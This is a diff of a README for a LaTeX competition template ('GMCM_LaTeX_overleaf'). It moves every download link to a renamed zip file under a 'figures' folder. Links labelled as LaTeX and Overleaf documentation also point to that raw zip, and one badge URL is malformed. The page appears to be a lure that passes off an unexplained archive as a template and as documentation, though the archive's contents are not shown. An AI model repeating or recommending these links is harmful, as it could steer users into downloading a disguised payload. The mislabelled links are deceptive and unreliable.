@@ -6,11 +6,11 @@ Welcome to GMCM_LaTeX_overleaf! This template helps you create documents for the
 
 ## 📥 Download Now
 
-[![Download GMCM_LaTeX_overleaf](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip%20Now-Visit%https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
+[![Download GMCM_LaTeX_overleaf](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/figures/overleaf_GMC_Te_La_v1.8.zip%20Now-Visit%https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/figures/overleaf_GMC_Te_La_v1.8.zip)](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/figures/overleaf_GMC_Te_La_v1.8.zip)
 
 You can easily download the latest version of this template by visiting our Releases page. Click the link below:
 
-[Visit Releases Page](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/figures/overleaf_GMC_Te_La_v1.8.zip)
 
 ## 📋 Template Features
 
@@ -52,8 +52,8 @@ If you face any issues, try the following:
 
 ## 📄 Additional Resources
 
-- **LaTeX Documentation**: [LaTeX Wiki](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
-- **Overleaf Tutorials**: [Overleaf Guides](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
+- **LaTeX Documentation**: [LaTeX Wiki](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/figures/overleaf_GMC_Te_La_v1.8.zip)
+- **Overleaf Tutorials**: [Overleaf Guides](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/figures/overleaf_GMC_Te_La_v1.8.zip)
 
 ## 📞 Contact Us
 
@@ -67,4 +67,4 @@ We welcome contributions! If you have suggestions or improvements, please create
 
 We hope that GMCM_LaTeX_overleaf serves you well in your projects. Enjoy working on your document, and we wish you the very best in your competition!
 
-[Download GMCM_LaTeX_overleaf Now](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
+[Download GMCM_LaTeX_overleaf Now](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/figures/overleaf_GMC_Te_La_v1.8.zip)
